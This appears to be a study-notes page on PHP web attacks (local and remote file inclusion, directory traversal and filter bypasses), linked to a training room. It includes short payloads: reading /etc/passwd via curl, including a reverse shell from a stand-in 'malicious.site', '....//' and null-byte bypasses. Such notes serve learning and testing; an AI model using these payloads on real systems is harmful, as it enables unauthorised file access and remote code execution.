# Files/Paths exploits

[![fileinc](../../../_badges/thmp/fileinc.svg)](https://tryhackme.com/room/fileinc)

<div class="row row-cols-md-2"><div>

Warning ‚ö†Ô∏è. You should use tools such as Burp Suite or `curl` to craft your payload and test if a form is vulnerable. You shouldn't trust that if you enter the path `/etc/passwd`, then this will be what is sent to the server, as some magic might happen in your browser (encoding...).

Another advantage of using tools is to bypass JavaScript filters!
</div><div>

* See [Burp Suite](/_cybersecurity/exploitation/web/burpsuite/index.md) (the repeater being appropriate)
* or using `curl`

```bash
# POST FORM
$ curl URL/vulnerable.php -d 'file=/etc/passwd' -H 'Content-Type: application/x-www-form-urlencoded'
```
</div></div>

<hr class="sep-both">

## File Inclusion

<div class="row row-cols-md-2"><div>

Files inclusion refers to websites that are importing <small>(`import/require` in PHP)</small> a file using the user input. For instance: `http://malicious.site/?lang=FR` that is doing an include using `$_GET["lang"]`.

If there is an include with no filtering, we can enter a path 

```php
include "lang/$_GET[lang].php"
```
</div><div>

**Local File Inclusion (LFI)** üè†: inject a local file

```php
// you uploaded a reverse shell (a fake PNG)
// as your avatar (avatar.png), then
include "lang/../uploads/avatar.png"
```

**Remote File Inclusion (RFI)** ‚úàÔ∏è: inject a remote file

```php
// allow_url_fopen MUST BE SET TO true
include "http://malicious.site/reverse_shell.php"
```
</div></div>

<hr class="sep-both">

## Path/directory traversal

<div class="row row-cols-md-2"><div>

This is an attack where a hacker will manage to access files/folders that were not supposed to be available for users by exploiting the application. 

In PHP for instance, developers may be use `file_get_contents(URL)` to download an avatar for instance given a URL. The problem is that this kind of function may be used to access a local file. If the file is displayed, or stored somewhere where you can read it such as in `/uploads`, then you may be able to 

* test if a port is open
* access private files such as `/etc/passwd` or `windows/win.ini`
* ...
</div><div>

For instance, a URL such as `http://example.com/image-preview.php?url=...` that is supposed to display an image given a URL, may be vulnerable to path traversal.

You can use the **dot-dot-slash attack**, and give a URL such as `../../../../../etc/passwd`. Note that `/../` is `/`, so if you add more `../` than needed, it's OK.
</div></div>

<hr class="sep-both">

## Bypass filters

<div class="row row-cols-md-2 mt-4"><div>

* If there is a function removing `../`, then you can craft a payload that will only work as expected once the input was filtered.

```
Input: ....//
Apply Filter: remove ../
Output: ../
```
</div><div>

* **PHP < 5.3.4**: if there was a constraint of a specific extension, you could use the **Null Byte** `%00` which indicates the end of a string.

```php
# bypass filter .md only
file=xxx.php%00.md
```

```php
include "xxx.cgi%00.php" // include xxx.cgi
```
</div></div>